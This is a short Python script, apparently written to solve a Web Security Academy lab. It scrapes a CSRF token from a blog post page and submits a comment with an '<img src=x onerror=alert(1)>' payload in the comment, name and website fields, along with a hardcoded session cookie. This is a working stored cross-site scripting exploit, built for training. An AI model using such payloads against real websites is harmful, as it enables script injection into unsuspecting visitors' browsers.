import requests
import re 

s = requests.Session()
url = "https://0acb00bd03a38de5c1126bb0000600da.web-security-academy.net/"

cookies = {
	"session": "x87DnF8G2IOd7MGGeJ1Dfzic3xcBlbVs"
}

# GET CSRF Token
params = {
	"postId": "6"
}

r1 = s.get(url + "post", params=params, cookies=cookies)

# print(r1.text)
csrfRgx = r"csrf\" value=\"(.*)\">"
csrf = re.findall(csrfRgx, r1.text)

data = {
	"csrf": csrf[0],
	"postId": "6",
	"comment": "<><img src=x onerror=alert(1)>",
	"name": "<><img src=x onerror=alert(1)>",
	"email": "test@test.com",
	"website": "https://google.com<><img src=x onerror=alert(1)>"
}

r2 = s.post(url + "post/comment", data=data, cookies=cookies)
print(r2.text)
